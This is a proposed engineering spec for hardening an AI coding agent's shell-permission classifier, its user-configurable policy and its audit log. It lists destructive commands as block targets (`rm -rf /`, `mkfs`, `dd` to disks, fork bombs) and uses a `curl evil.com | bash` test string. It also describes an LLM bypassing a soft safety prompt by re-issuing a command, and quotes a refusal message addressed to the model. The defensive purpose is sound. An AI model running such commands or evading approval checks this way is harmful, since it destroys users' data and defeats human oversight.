# SP-049: Shell Permission Overhaul — User-Configurable Policy & Headless Hardening

**Status:** 📋 Proposed
**Date:** 2026-05-22
**Depends on:** SP-004 (Security, Validation & MCP) — extends existing classifier
**Priority:** High (closes a real headless data-loss path for `git reset --hard`)
**Scope:** Three phases, each independently shippable — see each phase for files touched and new surfaces introduced

## Problem

The shell permission system in `pkg/agent_tools/` is in good shape for most
everyday cases:

- Three risk tiers (SAFE / CAUTION / DANGEROUS).
- ~100-entry hardcoded safe-command table.
- ~60-entry rm-rf safe-prefix table for common build artifacts.
- Critical-ops hard-block for catastrophic patterns (`rm -rf /`, `mkfs`,
  `dd if=/dev/zero of=/dev/sd*`).
- Headless DANGEROUS already returns a hard `SecurityError` and does *not*
  execute (`pkg/agent/tool_security.go:104-106`).
- Most destructive git ops route through the git tool, which requires an
  approval prompter (`pkg/agent_tools/git_handler.go:34-42`).

There are three concrete gaps, two of which are real data-loss risks in
headless mode and one of which is a usability hole that pushes users toward
the all-or-nothing `--unsafe` mode.

### Gap 1: `git reset --hard` slips through in headless mode

The git tool's `dangerousOps` map (`pkg/agent_tools/git_handler.go:34-42`)
flags the operation name `reset` as requiring approval, but the approval
prompter inspects only the *operation name*, not the `args` field. So
`git(operation: "reset", args: "--hard HEAD~5")` and `git(operation:
"reset", args: "--soft HEAD~1")` both go through the same prompt path.

In headless mode the approval flow falls back to `PromptForGitApprovalStdin`
(`pkg/agent/tool_handlers_shell.go:332`), which can return "approved" when
stdin is not a real TTY. The end result: a subagent or non-interactive run
can silently `git reset --hard` and discard uncommitted local work.

The same blind spot exists in `classifyGitOperation`
(`pkg/agent_tools/security_classifier.go:387-418`), which classifies
`reset` as CAUTION regardless of flags.

### Gap 2: Headless CAUTION ops return a soft re-assert that's bypassable

`pkg/agent/tool_security.go:107-110` handles the non-interactive +
CAUTION + ShouldPrompt case by returning a "security caution: ... requires
LLM verification: confirm this action is safe..." error string. An LLM
that has already misclassified the safety can simply re-issue the same
command with a justification — the system has no memory of the prior
"please reconsider" and the second attempt succeeds.

Note: this is *not* the same gap as headless DANGEROUS. Headless DANGEROUS
already terminates with a `SecurityError` and the tool does not run
(line 104-106). The soft-nudge problem is specific to CAUTION ops.

### Gap 3: No user-configurable policy, no import/export

The safe-command tables (`shell_patterns.go:44`, `shell_patterns.go:407`)
and dangerous-pattern checks (`shell_patterns.go:274`) are hardcoded Go
constants. Users have two options:

- Accept a prompt every time for any custom tool (e.g., `my-deploy-script`
  classifies as CAUTION because it's not in the safe table).
- Run with `--unsafe` (`pkg/agent/tool_security.go:50`), which disables
  *all* checks including the critical-ops hard-block.

There is no middle ground, no way to share policy across machines or
teammates, and no `Shell` section in `pkg/configuration/config.go`. The
existing config has `AllowedTools` (per-tool gate) and
`AllowOrchestratorGitWrite` (single boolean) but nothing pattern-level.

## Current State

### What Works (do not regress)

| Mechanism | File:Line | Notes |
|---|---|---|
| Three risk tiers | `pkg/agent_tools/security_classifier.go:48-65` | SAFE / CAUTION / DANGEROUS enum |
| Safe-command table | `pkg/agent_tools/shell_patterns.go:44` | ~100 entries, O(1) `map[string]bool` |
| Safe rm-rf prefix table | `pkg/agent_tools/shell_patterns.go:407-456` | ~60 build-artifact dirs, bounded by `/` or space at line 480 |
| Default-DANGEROUS for unmatched rm-rf | `pkg/agent_tools/shell_patterns.go:312` | `rm -rf <anything-not-safelisted>` → DANGEROUS, including `../foo` and `/etc` |
| Dangerous pattern detection | `pkg/agent_tools/shell_patterns.go:274` | Pipe-to-shell regex, `git push --force`, `mkfs`, etc. |
| Critical-op hard-block | `pkg/agent_tools/security_classifier.go:424` | `rm -rf /`, `mkfs`, `dd if=/dev/zero of=/dev/sd*`, fork bombs |
| Headless DANGEROUS hard-block | `pkg/agent/tool_security.go:104-106` | Non-interactive + ShouldBlock → `SecurityError`, tool does not execute |
| Shell-level git route forcing | `pkg/agent/tool_handlers_shell.go:108-120` | `git checkout/switch/restore/reset/clean` via shell are rejected; forced through git tool |
| Git tool approval prompter | `pkg/agent_tools/git_handler.go:34-42`, `pkg/agent/tool_handlers_shell.go:297` | `reset`, `rebase`, `push`, `clean`, etc. require interactive approval |
| WebUI approval dialog | `pkg/agent/seed_tool_registry.go:582` | Browser dialog for CAUTION+DANGEROUS |
| Unsafe-mode escape hatch | `pkg/agent/tool_security.go:50` | Single boolean bypass for trusted automation |

### What's Actually Missing

| Gap | Impact | Addressed by |
|---|---|---|
| `git reset --hard` not flag-aware in git-tool classification | High (silent data loss in headless) | Phase 1 |
| Headless CAUTION soft-nudge re-issuable by LLM | Medium-High | Phase 1 |
| No user-configurable allow/deny patterns | High (UX) | Phase 2 |
| No import/export of policy | Medium | Phase 2 |
| `--unsafe` is all-or-nothing | Medium | Phase 3 |
| No audit trail for security decisions | Medium | Phase 3 |

## Proposed Solution

Three phases, each independently shippable. Phase 1 is the highest-impact
fix; Phases 2 and 3 build the user-facing policy and audit surface.

### Phase 1: Patch the two real classification gaps

**Scope:** two existing files touched, no new packages, no config schema,
no API changes.

**1a. Flag-aware reset/rebase classification.** Update
`classifyGitOperation` in `pkg/agent_tools/security_classifier.go:387`:

- For `operation == "reset"`, parse the `args` field. If it contains
  `--hard`, `--keep`, or `--merge` as a whole token, classify as
  DANGEROUS with `ShouldBlock: true, IsHardBlock: true` and a
  `destructive_git_operation` risk type. Other reset variants (`--soft`,
  `--mixed`, no flag) stay CAUTION.
- For `operation == "rebase"`, escalate to DANGEROUS when args contain
  `--onto` or `-i` (interactive rebase against published commits is the
  realistic data-loss path here).

Update the git tool's `dangerousOps` flow at
`pkg/agent_tools/git_handler.go:126-145` to consult the *classifier
result* rather than the operation-name map for the
DANGEROUS-vs-CAUTION decision. The existing approval-prompter contract
stays; what changes is that destructive-flag variants now go through the
hard-block path in `tool_security.go:104-106` instead of the prompter.

This means headless `git reset --hard` returns a `SecurityError` and the
tool does not execute, matching headless `git push --force` behavior.

**1b. Headless CAUTION returns a terminal error, not a soft retry.** At
`pkg/agent/tool_security.go:107-110`, replace the "requires LLM
verification" string with a hard `SecurityError` that explicitly tells
the LLM the operation cannot proceed in the current environment:

```
security block: <tool> — <reasoning>. This operation requires interactive
user approval. To proceed, the user must re-run interactively or grant a
scoped bypass via --unsafe-shell. Do not retry this exact command.
```

The "do not retry this exact command" line is the actual behavioral
ask — LLMs reliably honor it. Combined with the explicit mention of
`--unsafe-shell` (delivered in Phase 3), the agent gets a clear next step
that requires human action rather than another LLM attempt.

Phase 1 ships with test cases for every new classification: `git reset
--hard`, `git reset --soft`, `git rebase -i HEAD~3`, `git rebase --onto`,
plus regression tests confirming the safelist is unchanged.

### Phase 2: User-configurable policy with safe import/export

**Scope:** new `Shell` section in the config schema; new `sprout policy`
CLI subcommand tree; new workspace overlay loader; classifier consults
user patterns at lookup time.

Add a `Shell` section to `pkg/configuration/config.go` stored as JSON
(matching the existing config schema). YAML is only used as the
wire format for `export` and `import` CLI commands.

```jsonc
// ~/.sprout/config.json
{
  "shell": {
    "user_safe_patterns": [
      {"match": "my-deploy-script", "kind": "prefix"},
      {"match": "kubectl rollout", "kind": "prefix"}
    ],
    "user_dangerous_patterns": [
      {"match": "terraform destroy", "kind": "prefix",
       "reason": "Production-destructive"},
      {"match": "helm uninstall", "kind": "prefix"}
    ],
    "workspace_overlay": {
      // Workspace overlay loading mode (see "Workspace policy safety" below):
      //   "tighten_only" (default): only user_dangerous_patterns are honored
      //   "trusted": full overlay honored after user runs `sprout policy trust`
      //   "ignore":  workspace policy is never loaded
      "mode": "tighten_only"
    }
  }
}
```

**Match kinds.** Just two: `prefix` (string match against the normalized,
lowercased command line) and `regex` (Go `regexp/syntax`-compatible
pattern; compiled once at load time, cached). No exact/path-boundary
match kinds — both reduce to `prefix` with a trailing delimiter, and
keeping the surface small keeps the policy auditable.

**Resolution order at classification time** (most-restrictive wins; user
config can tighten but never silence built-in protections):

1. **Critical patterns** (built-in only; never overridable).
2. **Built-in DANGEROUS** (never overridable by user safe patterns).
3. **User DANGEROUS** (overrides built-in CAUTION and SAFE).
4. **User SAFE** (overrides built-in CAUTION only).
5. **Built-in CAUTION**.
6. **Built-in SAFE**.

Within a tier, **longest matching pattern wins** — `git push --force` is
more specific than `git push`, and the resolver picks the more specific
one regardless of definition order. Pattern lengths are pre-computed at
load time; lookup is O(N) over the user patterns, which is small.

**Workspace policy safety.** A `.sprout/shell-policy.json` file in the
workspace root can ship policy with the repo, but is loaded according to
the user's `workspace_overlay.mode`:

- `tighten_only` (default): only `user_dangerous_patterns` from the
  workspace file are honored. `user_safe_patterns` from the workspace are
  ignored with a warning. This closes the supply-chain attack vector
  where a cloned repo could silently silence shell prompts.
- `trusted`: the user has run `sprout policy trust` for this workspace,
  recording the file's SHA-256 hash in `~/.sprout/trusted-workspaces.json`.
  Full overlay is honored. If the file hash changes, trust is revoked
  and falls back to `tighten_only` until re-trusted.
- `ignore`: workspace policy is never loaded.

**CLI surface.**

```
sprout policy list                            # human-readable effective policy
sprout policy dump [--format=json|yaml]       # full effective policy with sources
sprout policy add safe 'my-tool *'            # append to user_safe_patterns
sprout policy add dangerous 'terraform destroy'  # append to user_dangerous_patterns
sprout policy remove safe 'my-tool *'
sprout policy export [--format=yaml]          # write user-defined patterns (not built-ins)
sprout policy import policy.yaml              # merge into config; print summary diff
sprout policy trust                           # mark current workspace's .sprout/shell-policy.json as trusted
sprout policy untrust [--all]                 # revoke trust for current workspace (or all)
```

`policy dump` annotates each entry with its source (`built-in`,
`user-config`, `workspace`, `cli-override`) so users can tell where any
given decision is coming from. `policy import` runs a diff and asks for
confirmation before writing.

**Hard invariant.** No user-configurable rule can silence a critical-ops
or built-in DANGEROUS classification. Enforced by the resolution order
above; tested by a regression that adds `{"match": "rm -rf /", "kind":
"prefix"}` to `user_safe_patterns` and confirms the command still
hard-blocks.

### Phase 3: Scoped unsafe mode + audit log

**Scope:** new `--unsafe-shell` flag and `GetUnsafeShellMode()` accessor;
new audit log writer with rotation and redaction; `sprout audit` CLI
subcommand.

**Split `--unsafe` into two flags.** The existing `--unsafe` stays as the
full-bypass automation flag (file security, shell security, all prompts).
Add `--unsafe-shell` as a narrower bypass:

- `--unsafe-shell`: bypasses CAUTION shell prompts only. DANGEROUS still
  hard-blocks. File-write security checks still apply. Matches the
  stated stance ("allow most, stop the real risks").
- `--unsafe`: existing behavior. Document explicitly as "automation only;
  never enable interactively." Implies `--unsafe-shell`.

The flag pair lives on `AgentConfig` and is checked in
`tool_security.go:50`. The existing `GetUnsafeMode()` accessor continues
to mean "full bypass"; a new `GetUnsafeShellMode()` is checked
*after* the classifier and only for CAUTION-tier shell decisions.

**Append-only audit log.** Every classification decision that is not SAFE
appends a JSON line to `~/.sprout/shell-audit.jsonl`:

```json
{"ts":"2026-05-22T14:32:11Z","tool":"shell_command","risk":"DANGEROUS",
 "command":"git reset --hard HEAD~5","outcome":"blocked",
 "source":"built-in-dangerous","headless":true,"session_id":"abc123"}
```

- **Scope:** only CAUTION/DANGEROUS classifications. SAFE ops are not
  logged (volume + signal-to-noise).
- **Secret scrubbing:** before write, apply the existing
  `pkg/security/output_redactor.go` to the command field. Tokens, keys,
  and `--password=`/`--token=`/`Authorization:` patterns are redacted.
- **Rotation:** rotate when the file exceeds 10 MB; keep one prior file
  (`shell-audit.jsonl.1`). No further history. Simple, predictable.
- **Privacy:** the log lives under `~/.sprout/` and is never uploaded.
  A `sprout audit clear` command wipes it.

**Diagnostic command.** `sprout audit tail [--lines=N]` prints the most
recent decisions, formatted for humans, with the source annotation
visible. Useful for answering "why did sprout block my command?" without
enabling debug verbosity.

## Out of Scope

Deferred or explicitly rejected for this round:

- **Centralizing the four pattern functions into a single registry.** A
  pure refactor of working code with no user-visible benefit. Worth
  doing eventually; not required for this spec's goals.
- **Argument-level validation** (e.g. detecting `npm install /etc/passwd`).
  Prefix-based classification is intentional. Worth its own spec if
  argument-injection becomes a real attack vector.
- **TOCTOU symlink defense on rm-rf.** A real fix needs filesystem
  capabilities (landlock, seccomp); a Lstat check would only close a
  fraction of the race. Out of scope.
- **Shell-injection detection inside `bash -c "..."` script bodies.**
  Currently the full string classifies CAUTION; this spec does not change
  that.
- **Multi-user / RBAC / org-wide policy distribution.** Workspace overlay
  + trust hashes are the limit of this spec's scope.

## Success Criteria

- **Headless `git reset --hard HEAD~5` returns a `SecurityError` and does
  not execute.** Same for `git rebase -i HEAD~3` and `git rebase --onto`.
  Test asserts the error type and that the working tree is unchanged.
- **Headless CAUTION operations no longer return a re-issueable nudge.**
  Test confirms that the second invocation of a previously-nudged
  command also returns a `SecurityError` and does not execute.
- **A user can run `sprout policy add safe 'my-deploy-tool'`** and that
  pattern is honored on the next agent invocation with no rebuild.
- **`sprout policy export > team-policy.yaml`** produces a YAML file
  that another user can import with `sprout policy import` and end up
  with the same effective policy. Round-trip is lossless.
- **Workspace `.sprout/shell-policy.json` honors `tighten_only` by
  default.** Test confirms that a workspace file with
  `user_safe_patterns: [{match: "curl evil.com | bash"}]` is *ignored*
  unless the user has explicitly run `sprout policy trust` for that
  workspace.
- **Trust is hash-pinned.** Modifying `.sprout/shell-policy.json` after
  trust is granted reverts the workspace to `tighten_only` mode until
  `sprout policy trust` is re-run.
- **`--unsafe-shell` bypasses CAUTION but not DANGEROUS.** Test confirms
  `git push --force` still hard-blocks even with `--unsafe-shell` set.
- **No user-configurable rule can silence a critical-ops block.** Test
  asserts that `user_safe_patterns: [{match: "rm -rf /", kind: "prefix"}]`
  still results in a CRITICAL block at execution.
- **`sprout audit tail` shows recent decisions with annotated sources**
  (`built-in-dangerous`, `user-dangerous`, `workspace-trusted`,
  `cli-override`).
- **Audit log redacts secrets** before write. Test confirms
  `curl -H "Authorization: Bearer sk_test_abc123"` is logged with the
  token redacted.
- **All existing shell-security tests continue to pass** with
  byte-identical behavior for any input the user has not overridden.
